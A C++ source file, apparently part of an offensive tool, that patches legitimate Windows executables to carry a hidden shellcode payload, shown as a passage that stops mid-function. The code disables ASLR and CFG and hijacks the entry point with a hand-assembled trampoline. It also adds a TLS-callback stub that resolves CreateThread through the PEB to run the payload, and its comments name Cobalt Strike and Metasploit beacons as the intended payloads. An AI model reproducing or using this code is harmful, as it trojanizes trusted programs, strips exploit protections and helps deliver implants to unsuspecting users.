#include "PePatcher.h"
#include <fstream>
#include <format>
#include <filesystem>
#include <algorithm>
#include <cstring>

namespace Patcher::Core {

PePatcher::PePatcher(LogCallback logger)
    : m_logger(std::move(logger)) {
}

void PePatcher::Log(CUI::LogLevel level, const std::string& tag, const std::string& msg) {
    if (m_logger) {
        m_logger(level, tag, msg);
    }
}

namespace {

inline uint32_t AlignUp(uint32_t value, uint32_t alignment) {
    if (alignment == 0) return value;
    return (value + alignment - 1) / alignment * alignment;
}

inline size_t AlignUp(size_t value, size_t alignment) {
    if (alignment == 0) return value;
    return (value + alignment - 1) / alignment * alignment;
}

// PE 内存视图：封装 32/64 位头部差异访问
struct PeMap {
    IMAGE_DOS_HEADER* dos = nullptr;
    IMAGE_FILE_HEADER* fileHeader = nullptr;
    uint8_t* optBase = nullptr;
    IMAGE_SECTION_HEADER* sections = nullptr;
    bool is64 = false;

    IMAGE_DATA_DIRECTORY* DataDir(int index) {
        return is64
            ? &reinterpret_cast<IMAGE_OPTIONAL_HEADER64*>(optBase)->DataDirectory[index]
            : &reinterpret_cast<IMAGE_OPTIONAL_HEADER32*>(optBase)->DataDirectory[index];
    }
    uint32_t SectionAlignment() const {
        return is64 ? reinterpret_cast<const IMAGE_OPTIONAL_HEADER64*>(optBase)->SectionAlignment
                    : reinterpret_cast<const IMAGE_OPTIONAL_HEADER32*>(optBase)->SectionAlignment;
    }
    uint32_t FileAlignment() const {
        return is64 ? reinterpret_cast<const IMAGE_OPTIONAL_HEADER64*>(optBase)->FileAlignment
                    : reinterpret_cast<const IMAGE_OPTIONAL_HEADER32*>(optBase)->FileAlignment;
    }
    uint32_t SizeOfImage() const {
        return is64 ? reinterpret_cast<const IMAGE_OPTIONAL_HEADER64*>(optBase)->SizeOfImage
                    : reinterpret_cast<const IMAGE_OPTIONAL_HEADER32*>(optBase)->SizeOfImage;
    }
    void SetSizeOfImage(uint32_t v) {
        if (is64) reinterpret_cast<IMAGE_OPTIONAL_HEADER64*>(optBase)->SizeOfImage = v;
        else reinterpret_cast<IMAGE_OPTIONAL_HEADER32*>(optBase)->SizeOfImage = v;
    }
    void SetEntryPoint(uint32_t rva) {
        if (is64) reinterpret_cast<IMAGE_OPTIONAL_HEADER64*>(optBase)->AddressOfEntryPoint = rva;
        else reinterpret_cast<IMAGE_OPTIONAL_HEADER32*>(optBase)->AddressOfEntryPoint = rva;
    }
    uint32_t EntryPoint() const {
        return is64 ? reinterpret_cast<const IMAGE_OPTIONAL_HEADER64*>(optBase)->AddressOfEntryPoint
                    : reinterpret_cast<const IMAGE_OPTIONAL_HEADER32*>(optBase)->AddressOfEntryPoint;
    }
    WORD& DllCharacteristics() {
        return is64 ? reinterpret_cast<IMAGE_OPTIONAL_HEADER64*>(optBase)->DllCharacteristics
                    : reinterpret_cast<IMAGE_OPTIONAL_HEADER32*>(optBase)->DllCharacteristics;
    }
    uint32_t SizeOfHeaders() const {
        return is64 ? reinterpret_cast<const IMAGE_OPTIONAL_HEADER64*>(optBase)->SizeOfHeaders
                    : reinterpret_cast<const IMAGE_OPTIONAL_HEADER32*>(optBase)->SizeOfHeaders;
    }
    uint64_t ImageBase() const {
        return is64 ? reinterpret_cast<const IMAGE_OPTIONAL_HEADER64*>(optBase)->ImageBase
                    : reinterpret_cast<const IMAGE_OPTIONAL_HEADER32*>(optBase)->ImageBase;
    }
    void SetImageBase(uint64_t v) {
        if (is64) reinterpret_cast<IMAGE_OPTIONAL_HEADER64*>(optBase)->ImageBase = v;
        else reinterpret_cast<IMAGE_OPTIONAL_HEADER32*>(optBase)->ImageBase = static_cast<uint32_t>(v);
    }
    WORD SectionCount() const { return fileHeader->NumberOfSections; }

    IMAGE_SECTION_HEADER* LastFileSection() { // 占据文件末尾的节
        IMAGE_SECTION_HEADER* last = sections;
        for (WORD i = 1; i < fileHeader->NumberOfSections; ++i) {
            auto* s = &sections[i];
            if (s->PointerToRawData + s->SizeOfRawData > last->PointerToRawData + last->SizeOfRawData) {
                last = s;
            }
        }
        return last;
    }
};

bool MapPeBuffer(std::vector<uint8_t>& buf, PeMap& m) {
    if (buf.size() < sizeof(IMAGE_DOS_HEADER)) return false;
    m.dos = reinterpret_cast<IMAGE_DOS_HEADER*>(buf.data());
    if (m.dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
    const size_t fhOff = static_cast<size_t>(m.dos->e_lfanew) + sizeof(DWORD);
    if (fhOff + sizeof(IMAGE_FILE_HEADER) > buf.size()) return false;
    m.fileHeader = reinterpret_cast<IMAGE_FILE_HEADER*>(buf.data() + fhOff);
    const size_t optOff = fhOff + sizeof(IMAGE_FILE_HEADER);
    if (optOff >= buf.size()) return false;
    m.optBase = buf.data() + optOff;
    const WORD magic = *reinterpret_cast<WORD*>(m.optBase);
    if (magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) m.is64 = true;
    else if (magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC) return false;
    const size_t secTableEnd = optOff + m.fileHeader->SizeOfOptionalHeader +
                               sizeof(IMAGE_SECTION_HEADER) * m.fileHeader->NumberOfSections;
    if (secTableEnd > buf.size()) return false;
    m.sections = reinterpret_cast<IMAGE_SECTION_HEADER*>(buf.data() + optOff + m.fileHeader->SizeOfOptionalHeader);
    return true;
}

uint32_t RvaToOffset(const PeMap& m, const std::vector<uint8_t>& buf, uint32_t rva) {
    if (rva == 0) return 0;
    for (WORD i = 0; i < m.fileHeader->NumberOfSections; ++i) {
        const IMAGE_SECTION_HEADER* s = &m.sections[i];
        if (s->PointerToRawData == 0) continue;
        const uint32_t span = (std::max)(s->Misc.VirtualSize, s->SizeOfRawData);
        if (rva >= s->VirtualAddress && rva < s->VirtualAddress + span) {
            const size_t off = static_cast<size_t>(s->PointerToRawData) + (rva - s->VirtualAddress);
            return off < buf.size() ? static_cast<uint32_t>(off) : 0;
        }
    }
    return 0;
}

// 剥离 ASLR (DYNAMIC_BASE/HIGH_ENTROPY_VA) 与 CFG (GUARD_CF)，清空 LOAD_CONFIG，并规避载荷 ImageBase 冲突
void DisableAslrAndCfg(PeMap& m, bool clearTls = false) {
    auto& dllChars = m.DllCharacteristics();
    dllChars &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
    dllChars &= ~IMAGE_DLLCHARACTERISTICS_HIGH_ENTROPY_VA;
    dllChars &= ~IMAGE_DLLCHARACTERISTICS_GUARD_CF;

    IMAGE_DATA_DIRECTORY* loadConfig = m.DataDir(IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG);
    if (loadConfig && loadConfig->VirtualAddress != 0) {
        loadConfig->VirtualAddress = 0;
        loadConfig->Size = 0;
    }

    if (clearTls) {
        IMAGE_DATA_DIRECTORY* tlsDir = m.DataDir(IMAGE_DIRECTORY_ENTRY_TLS);
        if (tlsDir && tlsDir->VirtualAddress != 0) {
            tlsDir->VirtualAddress = 0;
            tlsDir->Size = 0;
        }
    }

    // 载荷基址避让：主流 64 位反射式 PE 载荷（如 CS/MSF beacon）嵌入的 PE 默认基址为 0x140000000。
    // 如果白文件基址恰好也是 0x140000000，载荷解密执行时会调用 NtUnmapViewOfSection(0x140000000)
    // 试图腾出空间，这会导致直接将白文件自身代码全部卸载并触发 0xc0000005 崩溃！
    // 因此如果白文件为 64 位且 ImageBase == 0x140000000，将其平移至 0x150000000，彻底避免冲突。
    if (m.is64 && m.ImageBase() == 0x140000000ULL) {
        m.SetImageBase(0x150000000ULL);
    }
}

// 规范化载荷代码：若末尾缺少 ret 指令，自动补齐 ret (0xC3)，确保载荷执行后能安全返回跳板
std::vector<uint8_t> NormalizePayload(const std::vector<uint8_t>& payload) {
    std::vector<uint8_t> norm = payload;
    if (norm.empty()) return norm;

    size_t lastNz = norm.size();
    while (lastNz > 0 && norm[lastNz - 1] == 0) {
        --lastNz;
    }
    if (lastNz > 0) {
        const uint8_t lastByte = norm[lastNz - 1];
        // 0xC3 = ret, 0xC2 = ret imm16
        bool hasRet = (lastByte == 0xC3);
        if (!hasRet && lastNz >= 3 && norm[lastNz - 3] == 0xC2) {
            hasRet = true;
        }
        if (!hasRet) {
            norm.resize(lastNz);
            norm.push_back(0xC3); // 自动补齐 ret
        }
    }
    return norm;
}

// 构造入口点跳板 Stub：保护现场 -> 对齐栈 -> 调用载荷 -> 恢复现场 -> 跳回原入口点 (OEP)
std::vector<uint8_t> BuildOepTrampoline(bool is64, uint32_t trampolineRva, uint32_t payloadRva, uint32_t originalOepRva) {
    std::vector<uint8_t> stub;
    if (is64) {
        stub = {
            0x9C,                               // 0: pushfq
            0x50, 0x51, 0x52, 0x53,             // 1: push rax, rcx, rdx, rbx
            0x55, 0x56, 0x57,                   // 5: push rbp, rsi, rdi
            0x41, 0x50, 0x41, 0x51,             // 8: push r8, r9
            0x41, 0x52, 0x41, 0x53,             // 12: push r10, r11
            0x41, 0x54, 0x41, 0x55,             // 16: push r12, r13
            0x41, 0x56, 0x41, 0x57,             // 20: push r14, r15
            0x48, 0x89, 0xE5,                   // 24: mov rbp, rsp
            0x48, 0x83, 0xE4, 0xF0,             // 27: and rsp, -16
            0x48, 0x83, 0xEC, 0x20,             // 31: sub rsp, 32
            0xE8, 0, 0, 0, 0,                   // 35: call payload (rel32 at 36)
            0x48, 0x89, 0xEC,                   // 40: mov rsp, rbp
            0x41, 0x5F, 0x41, 0x5E,             // 43: pop r15, r14
            0x41, 0x5D, 0x41, 0x5C,             // 47: pop r13, r12
            0x41, 0x5B, 0x41, 0x5A,             // 51: pop r11, r10
            0x41, 0x59, 0x41, 0x58,             // 55: pop r9, r8
            0x5F, 0x5E, 0x5D,                   // 59: pop rdi, rsi, rbp
            0x5B, 0x5A, 0x59, 0x58,             // 62: pop rbx, rdx, rcx, rax
            0x9D,                               // 66: popfq
            0xE9, 0, 0, 0, 0                    // 67: jmp original OEP (rel32 at 68)
        };

        const int32_t callRel32 = static_cast<int32_t>(payloadRva - (trampolineRva + 40));
        for (int i = 0; i < 4; ++i) stub[36 + i] = static_cast<uint8_t>((callRel32 >> (i * 8)) & 0xFF);

        const int32_t jmpRel32 = static_cast<int32_t>(originalOepRva - (trampolineRva + 72));
        for (int i = 0; i < 4; ++i) stub[68 + i] = static_cast<uint8_t>((jmpRel32 >> (i * 8)) & 0xFF);
    } else {
        stub = {
            0x9C,                               // 0: pushfd
            0x60,                               // 1: pushad
            0xE8, 0, 0, 0, 0,                   // 2: call payload (rel32 at 3)
            0x61,                               // 7: popad
            0x9D,                               // 8: popfd
            0xE9, 0, 0, 0, 0                    // 9: jmp original OEP (rel32 at 10)
        };

        const int32_t callRel32 = static_cast<int32_t>(payloadRva - (trampolineRva + 7));
        for (int i = 0; i < 4; ++i) stub[3 + i] = static_cast<uint8_t>((callRel32 >> (i * 8)) & 0xFF);

        const int32_t jmpRel32 = static_cast<int32_t>(originalOepRva - (trampolineRva + 14));
        for (int i = 0; i < 4; ++i) stub[10 + i] = static_cast<uint8_t>((jmpRel32 >> (i * 8)) & 0xFF);
    }
    return stub;
}

// 构造 TLS 回调 Wrapper：动态解析 kernel32!CreateThread，在独立线程中异步拉起载荷，回调立即返回，彻底避免加载器锁死锁 (Loader Lock Deadlock)
std::vector<uint8_t> BuildTlsWrapper(bool is64, uint32_t wrapperRva, uint32_t payloadRva, uint32_t flagRva, uint64_t imageBase) {
    std::vector<uint8_t> stub;
    if (is64) {
        stub = {
            0x83, 0xFA, 0x01,                                     // 0x00: cmp edx, 1 (DLL_PROCESS_ATTACH)
            0x0F, 0x85, 0xD7, 0x00, 0x00, 0x00,                   // 0x03: jne ExitStub (0xE0)
            0x48, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00,             // 0x09: lea rax, [rip + flagDisp] (disp at 0x0C)
            0x80, 0x38, 0x00,                                     // 0x10: cmp byte ptr [rax], 0
            0x0F, 0x85, 0xC7, 0x00, 0x00, 0x00,                   // 0x13: jne ExitStub (0xE0)
            0xC6, 0x00, 0x01,                                     // 0x19: mov byte ptr [rax], 1
            0x53,                                                 // 0x1C: push rbx
            0x56,                                                 // 0x1D: push rsi
            0x57,                                                 // 0x1E: push rdi
            0x41, 0x54,                                           // 0x1F: push r12
            0x41, 0x55,                                           // 0x21: push r13
            0x41, 0x56,                                           // 0x23: push r14
            0x41, 0x57,                                           // 0x25: push r15
            0x48, 0x83, 0xEC, 0x48,                               // 0x27: sub rsp, 0x48
            0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, // 0x2B: mov rax, gs:[0x60] (PEB)
            0x48, 0x8B, 0x40, 0x18,                               // 0x34: mov rax, [rax + 0x18] (PEB->Ldr)
            0x48, 0x8B, 0x70, 0x10,                               // 0x38: mov rsi, [rax + 0x10] (InLoadOrderModuleList)
            0x48, 0x8B, 0x36,                                     // 0x3C: mov rsi, [rsi] (2nd: ntdll)
            0x48, 0x8B, 0x36,                                     // 0x3F: mov rsi, [rsi] (3rd: kernel32)
            0x48, 0x8B, 0x5E, 0x30,                               // 0x42: mov rbx, [rsi + 0x30] (kernel32 DllBase)
            0x8B, 0x43, 0x3C,                                     // 0x46: mov eax, [rbx + 0x3C] (e_lfanew)
            0x8B, 0x94, 0x03, 0x88, 0x00, 0x00, 0x00,             // 0x49: mov edx, [rbx + rax + 0x88] (Export Dir RVA)
            0x48, 0x03, 0xD3,                                     // 0x50: add rdx, rbx (Export Dir VA)
            0x8B, 0x4A, 0x18,                                     // 0x53: mov ecx, [rdx + 0x18] (NumberOfNames)
            0x44, 0x8B, 0x42, 0x20,                               // 0x56: mov r8d, [rdx + 0x20] (AddressOfNames RVA)
            0x4C, 0x03, 0xC3,                                     // 0x5A: add r8, rbx
            0x44, 0x8B, 0x4A, 0x24,                               // 0x5D: mov r9d, [rdx + 0x24] (AddressOfNameOrdinals RVA)
            0x4C, 0x03, 0xCB,                                     // 0x61: add r9, rbx
            0x44, 0x8B, 0x52, 0x1C,                               // 0x64: mov r10d, [rdx + 0x1C] (AddressOfFunctions RVA)
            0x4C, 0x03, 0xD3,                                     // 0x68: add r10, rbx
            0x33, 0xFF,                                           // 0x6B: xor edi, edi (index = 0)
            // SearchLoop: (0x6D)
            0x3B, 0xF9,                                           // 0x6D: cmp edi, ecx
            0x73, 0x5D,                                           // 0x6F: jae FailExit (0xCE)
            0x41, 0x8B, 0x34, 0xB8,                               // 0x71: mov esi, [r8 + rdi*4] (Name RVA)
            0x48, 0x03, 0xF3,                                     // 0x75: add rsi, rbx
            0x48, 0x8B, 0x06,                                     // 0x78: mov rax, [rsi]
            0x49, 0xBB, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x54, 0x68, // 0x7B: mov r11, 'CreateTh'
            0x49, 0x3B, 0xC3,                                     // 0x85: cmp rax, r11
            0x75, 0x40,                                           // 0x88: jne NextName (0xCA)
            0x8B, 0x46, 0x08,                                     // 0x8A: mov eax, [rsi + 8]
            0x3D, 0x72, 0x65, 0x61, 0x64,                         // 0x8D: cmp eax, 'read' (0x64616572)
            0x75, 0x36,                                           // 0x92: jne NextName (0xCA)
            0x80, 0x7E, 0x0C, 0x00,                               // 0x94: cmp byte ptr [rsi + 12], 0
            0x75, 0x30,                                           // 0x98: jne NextName (0xCA)
            // Found CreateThread!
            0x41, 0x0F, 0xB7, 0x04, 0x79,                         // 0x9A: movzx eax, word ptr [r9 + rdi*2] (Ordinal)
            0x41, 0x8B, 0x04, 0x82,                               // 0x9F: mov eax, [r10 + rax*4] (Func RVA)
            0x48, 0x03, 0xC3,                                     // 0xA3: add rax, rbx (CreateThread VA)
            0x4C, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00,             // 0xA6: lea r8, [rip + payloadDisp] (disp at 0xA9)
            0x33, 0xC9,                                           // 0xAD: xor ecx, ecx
            0x33, 0xD2,                                           // 0xAF: xor edx, edx
            0x4D, 0x33, 0xC9,                                     // 0xB1: xor r9, r9
            0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, // 0xB4: mov qword ptr [rsp + 0x20], 0
            0x48, 0xC7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x00, // 0xBD: mov qword ptr [rsp + 0x28], 0
            0xFF, 0xD0,                                           // 0xC6: call rax (CreateThread)
            0xEB, 0x07,                                           // 0xC8: jmp Epilogue (0xD1)
            // NextName: (0xCA)
            0xFF, 0xC7,                                           // 0xCA: inc edi
            0xEB, 0x9F,                                           // 0xCC: jmp SearchLoop (0x6D)
            // FailExit: (0xCE)
            0x48, 0x33, 0xC0,                                     // 0xCE: xor rax, rax
            // Epilogue: (0xD1)
            0x48, 0x83, 0xC4, 0x48,                               // 0xD1: add rsp, 0x48
            0x41, 0x5F,                                           // 0xD5: pop r15
            0x41, 0x5E,                                           // 0xD7: pop r14
            0x41, 0x5D,                                           // 0xD9: pop r13
            0x41, 0x5C,                                           // 0xDB: pop r12
            0x5F,                                                 // 0xDD: pop rdi
            0x5E,                                                 // 0xDE: pop rsi
            0x5B,                                                 // 0xDF: pop rbx
            // ExitStub: (0xE0)
            0xC3                                                  // 0xE0: ret
        };

        const int32_t flagDisp = static_cast<int32_t>(flagRva - (wrapperRva + 0x09 + 7));
        for (int i = 0; i < 4; ++i) stub[0x0C + i] = static_cast<uint8_t>((flagDisp >> (i * 8)) & 0xFF);

        const int32_t payloadDisp = static_cast<int32_t>(payloadRva - (wrapperRva + 0xA6 + 7));
        for (int i = 0; i < 4; ++i) stub[0xA9 + i] = static_cast<uint8_t>((payloadDisp >> (i * 8)) & 0xFF);
    } else {
        stub = {
            0x8B, 0x44, 0x24, 0x08,                               // 0x00: mov eax, [esp + 8] (Reason)
            0x83, 0xF8, 0x01,                                     // 0x04: cmp eax, 1
            0x0F, 0x85, 0x97, 0x00, 0x00, 0x00,                   // 0x07: jne ExitStub (0xA4)
            0xB8, 0x00, 0x00, 0x00, 0x00,                         // 0x0D: mov eax, offset RunFlag (addr at 0x0E)
            0x80, 0x38, 0x00,                                     // 0x12: cmp byte ptr [eax], 0
            0x0F, 0x85, 0x89, 0x00, 0x00, 0x00,                   // 0x15: jne ExitStub (0xA4)
            0xC6, 0x00, 0x01,                                     // 0x1B: mov byte ptr [eax], 1
            0x53,                                                 // 0x1E: push ebx
            0x56,                                                 // 0x1F: push esi
            0x57,                                                 // 0x20: push edi
            0x55,                                                 // 0x21: push ebp
            0x64, 0xA1, 0x30, 0x00, 0x00, 0x00,                   // 0x22: mov eax, fs:[0x30] (PEB)
            0x8B, 0x40, 0x0C,                                     // 0x28: mov eax, [eax + 0x0C] (PEB->Ldr)
            0x8B, 0x70, 0x0C,                                     // 0x2B: mov esi, [eax + 0x0C] (InLoadOrderModuleList)
            0x8B, 0x36,                                           // 0x2E: mov esi, [esi] (2nd: ntdll)
            0x8B, 0x36,                                           // 0x30: mov esi, [esi] (3rd: kernel32)
            0x8B, 0x5E, 0x18,                                     // 0x32: mov ebx, [esi + 0x18] (kernel32 DllBase)
            0x8B, 0x43, 0x3C,                                     // 0x35: mov eax, [ebx + 0x3C] (e_lfanew)
            0x8B, 0x54, 0x03, 0x78,                               // 0x38: mov edx, [ebx + eax + 0x78] (Export Dir RVA)
            0x03, 0xD3,                                           // 0x3C: add edx, ebx (Export Dir VA)
            0x8B, 0x4A, 0x18,                                     // 0x3E: mov ecx, [edx + 0x18] (NumberOfNames)
            0x8B, 0x72, 0x20,                                     // 0x41: mov esi, [edx + 0x20] (AddressOfNames RVA)
            0x03, 0xF3,                                           // 0x44: add esi, ebx
            0x8B, 0x7A, 0x24,                                     // 0x46: mov edi, [edx + 0x24] (AddressOfNameOrdinals RVA)
            0x03, 0xFB,                                           // 0x49: add edi, ebx
            0x8B, 0x6A, 0x1C,                                     // 0x4B: mov ebp, [edx + 0x1C] (AddressOfFunctions RVA)
            0x03, 0xEB,                                           // 0x4E: add ebp, ebx
            0x33, 0xC0,                                           // 0x50: xor eax, eax (index = 0)
            // SearchLoop: (0x52)
            0x3B, 0xC1,                                           // 0x52: cmp eax, ecx
            0x73, 0x48,                                           // 0x54: jae FailExit (0x9E)
            0x52,                                                 // 0x56: push edx
            0x8B, 0x14, 0x86,                                     // 0x57: mov edx, [esi + eax*4] (Name RVA)
            0x03, 0xD3,                                           // 0x5A: add edx, ebx
            0x81, 0x3A, 0x43, 0x72, 0x65, 0x61,                   // 0x5C: cmp dword ptr [edx], 'Crea'
            0x75, 0x36,                                           // 0x62: jne NextName (0x9A)
            0x81, 0x7A, 0x04, 0x74, 0x65, 0x54, 0x68,             // 0x64: cmp dword ptr [edx + 4], 'teTh'
            0x75, 0x2D,                                           // 0x6B: jne NextName (0x9A)
            0x81, 0x7A, 0x08, 0x72, 0x65, 0x61, 0x64,             // 0x6D: cmp dword ptr [edx + 8], 'read'
            0x75, 0x24,                                           // 0x74: jne NextName (0x9A)
            0x80, 0x7A, 0x0C, 0x00,                               // 0x76: cmp byte ptr [edx + 12], 0
            0x75, 0x1E,                                           // 0x7A: jne NextName (0x9A)
            // Found:
            0x5A,                                                 // 0x7C: pop edx
            0x0F, 0xB7, 0x04, 0x47,                               // 0x7D: movzx eax, word ptr [edi + eax*2] (Ordinal)
            0x8B, 0x44, 0x85, 0x00,                               // 0x81: mov eax, [ebp + eax*4] (Func RVA)
            0x03, 0xC3,                                           // 0x85: add eax, ebx (CreateThread VA)
            0x6A, 0x00,                                           // 0x87: push 0
            0x6A, 0x00,                                           // 0x89: push 0
            0x6A, 0x00,                                           // 0x8B: push 0
            0x68, 0x00, 0x00, 0x00, 0x00,                         // 0x8D: push PayloadVA (addr at 0x8E)
            0x6A, 0x00,                                           // 0x92: push 0
            0x6A, 0x00,                                           // 0x94: push 0
            0xFF, 0xD0,                                           // 0x96: call eax (CreateThread)
            0xEB, 0x06,                                           // 0x98: jmp Epilogue (0xA0)
            // NextName: (0x9A)
            0x5A,                                                 // 0x9A: pop edx
            0x40,                                                 // 0x9B: inc eax
            0xEB, 0xB4,                                           // 0x9C: jmp SearchLoop (0x52)
            // FailExit: (0x9E)
            0x33, 0xC0,                                           // 0x9E: xor eax, eax
            // Epilogue: (0xA0)
            0x5D,                                                 // 0xA0: pop ebp
            0x5F,                                                 // 0xA1: pop edi
            0x5E,                                                 // 0xA2: pop esi
            0x5B,                                                 // 0xA3: pop ebx
            // ExitStub: (0xA4)
            0xC2, 0x0C, 0x00                                      // 0xA4: ret 0x0C
        };

        const uint32_t flagVa = static_cast<uint32_t>(imageBase + flagRva);
        for (int i = 0; i < 4; ++i) stub[0x0E + i] = static_cast<uint8_t>((flagVa >> (i * 8)) & 0xFF);

        const uint32_t payloadVa = static_cast<uint32_t>(imageBase + payloadRva);
        for (int i = 0; i < 4; ++i) stub[0x8E + i] = static_cast<uint8_t>((payloadVa >> (i * 8)) & 0xFF);
    }
    return stub;
}

} // namespace

bool PePatcher::ReadBinaryFile(const std::wstring& filePath, std::vector<uint8_t>& outData) {
    std::ifstream file(filePath, std::ios::binary | std::ios::ate);
    if (!file.is_open()) {
        Log(CUI::LogLevel::Error, "IO", "无法打开文件进行读取: " + WstrToUtf8(filePath));
        return false;
    }

    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);

    outData.resize(static_cast<size_t>(size));
    if (!file.read(reinterpret_cast<char*>(outData.data()), size)) {
        Log(CUI::LogLevel::Error, "IO", "读取文件失败");
        return false;
    }
    return true;
}

bool PePatcher::WriteBinaryFile(const std::wstring& filePath, const std::vector<uint8_t>& data) {
    std::ofstream file(filePath, std::ios::binary);
    if (!file.is_open()) {
        Log(CUI::LogLevel::Error, "IO", "无法打开输出文件进行写入: " + WstrToUtf8(filePath));
        return false;
    }

    file.write(reinterpret_cast<const char*>(data.data()), data.size());
    if (!file.good()) {
        Log(CUI::LogLevel::Error, "IO", "写入输出文件失败");
        return false;
    }
    return true;
}

bool PePatcher::InspectPe(const std::wstring& pePath, PeFileInfo& outInfo) {
    std::vector<uint8_t> buffer;
    if (!ReadBinaryFile(pePath, buffer) || buffer.size() < sizeof(IMAGE_DOS_HEADER)) {
        return false;
    }

    auto* dosHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(buffer.data());
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        Log(CUI::LogLevel::Error, "PE", "无效的 DOS 头签名 (非 MZ)");
        return false;
    }

    if (dosHeader->e_lfanew <= 0 || static_cast<size_t>(dosHeader->e_lfanew) + sizeof(DWORD) > buffer.size()) {
        Log(CUI::LogLevel::Error, "PE", "PE 头部偏移超出文件范围");
        return false;
    }

    auto* ntSignature = reinterpret_cast<DWORD*>(buffer.data() + dosHeader->e_lfanew);
    if (*ntSignature != IMAGE_NT_SIGNATURE) {
        Log(CUI::LogLevel::Error, "PE", "无效的 NT 头签名 (非 PE00)");
        return false;
    }

    auto* fileHeader = reinterpret_cast<IMAGE_FILE_HEADER*>(buffer.data() + dosHeader->e_lfanew + sizeof(DWORD));
    outInfo.sectionCount = fileHeader->NumberOfSections;

    WORD optMagic = *reinterpret_cast<WORD*>(buffer.data() + dosHeader->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER));
    IMAGE_SECTION_HEADER* firstSection = nullptr;

    if (optMagic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        outInfo.is64Bit = true;
        auto* opt64 = reinterpret_cast<IMAGE_OPTIONAL_HEADER64*>(buffer.data() + dosHeader->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER));
        outInfo.imageBase = opt64->ImageBase;
        outInfo.entryPointRva = opt64->AddressOfEntryPoint;
        outInfo.entryPointVa = opt64->ImageBase + opt64->AddressOfEntryPoint;
        outInfo.subsystem = opt64->Subsystem;
        outInfo.hasSignature = (opt64->DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress != 0 &&
                                opt64->DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size != 0);

        firstSection = reinterpret_cast<IMAGE_SECTION_HEADER*>(
            reinterpret_cast<uint8_t*>(opt64) + fileHeader->SizeOfOptionalHeader
        );
    } else if (optMagic == IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
        outInfo.is64Bit = false;
        auto* opt32 = reinterpret_cast<IMAGE_OPTIONAL_HEADER32*>(buffer.data() + dosHeader->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER));
        outInfo.imageBase = opt32->ImageBase;
        outInfo.entryPointRva = opt32->AddressOfEntryPoint;
        outInfo.entryPointVa = opt32->ImageBase + opt32->AddressOfEntryPoint;
        outInfo.subsystem = opt32->Subsystem;
        outInfo.hasSignature = (opt32->DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress != 0 &&
                                opt32->DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size != 0);

        firstSection = reinterpret_cast<IMAGE_SECTION_HEADER*>(
            reinterpret_cast<uint8_t*>(opt32) + fileHeader->SizeOfOptionalHeader
        );
    } else {
        Log(CUI::LogLevel::Error, "PE", "未知的 OptionalHeader Magic: 0x" + std::format("{:04X}", optMagic));
        return false;
    }

    // 查找 .text 节
    for (DWORD i = 0; i < fileHeader->NumberOfSections; ++i) {
        IMAGE_SECTION_HEADER* sec = &firstSection[i];
        if (strncmp(reinterpret_cast<const char*>(sec->Name), ".text", 5) == 0) {
            outInfo.textSectionOffset = sec->PointerToRawData;
            outInfo.textSectionSize = sec->SizeOfRawData;
            break;
        }
    }

    return true;
}

bool PePatcher::EvaluatePatchModes(const std::wstring& whitePath, const std::wstring& payloadPath, PatchModeAvailability& outAvail) {
    outAvail = PatchModeAvailability();

    if (whitePath.empty() || payloadPath.empty()) {
        return false;
    }
    if (!std::filesystem::exists(whitePath) || !std::filesystem::exists(payloadPath)) {
        return false;
    }

    std::error_code ec;
    outAvail.payloadSize = std::filesystem::file_size(payloadPath, ec);
    if (ec) {
        return false;
    }

    std::vector<uint8_t> whiteBuf;
    if (!ReadBinaryFile(whitePath, whiteBuf)) {
        return false;
    }

    PeMap m;
    if (!MapPeBuffer(whiteBuf, m) || m.SectionCount() == 0) {
        return false;
    }

    PeFileInfo info;
    if (!InspectPe(whitePath, info)) {
        return false;
    }

    // 模式 0: .text 代码段覆盖
    outAvail.textSectionCapacity = info.textSectionSize;
    outAvail.canReplaceText = (info.textSectionOffset != 0 && info.textSectionSize > 0 && outAvail.payloadSize <= info.textSectionSize);

    // 模式 1: 入口点 OEP 覆盖
    outAvail.canInjectOep = false;
    outAvail.oepRemainingCapacity = 0;
    for (WORD i = 0; i < m.SectionCount(); ++i) {
        const auto* s = &m.sections[i];
        if (s->PointerToRawData != 0 &&
            info.entryPointRva >= s->VirtualAddress &&
            info.entryPointRva < s->VirtualAddress + s->SizeOfRawData) {
            outAvail.oepRemainingCapacity = (s->VirtualAddress + s->SizeOfRawData) - info.entryPointRva;
            if (outAvail.payloadSize <= outAvail.oepRemainingCapacity) {
                outAvail.canInjectOep = true;
            }
            break;
        }
    }

    // 模式 2: 末节扩容（空间自由扩充，始终可用）
    outAvail.canEnlargeLastSection = (m.SectionCount() > 0);

    // 模式 3: 新增节区（检查节表空间是否充足）
    outAvail.canAddNewSection = false;
    if (m.SectionCount() < 96) {
        uint32_t firstRaw = 0xFFFFFFFFu;
        for (WORD i = 0; i < m.SectionCount(); ++i) {
            if (m.sections[i].PointerToRawData != 0) {
                firstRaw = (std::min)(firstRaw, static_cast<uint32_t>(m.sections[i].PointerToRawData));
            }
        }
        const size_t optOff = static_cast<size_t>(m.dos->e_lfanew) + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER);
        const size_t secTableEnd = optOff + m.fileHeader->SizeOfOptionalHeader +
                                   sizeof(IMAGE_SECTION_HEADER) * m.fileHeader->NumberOfSections;
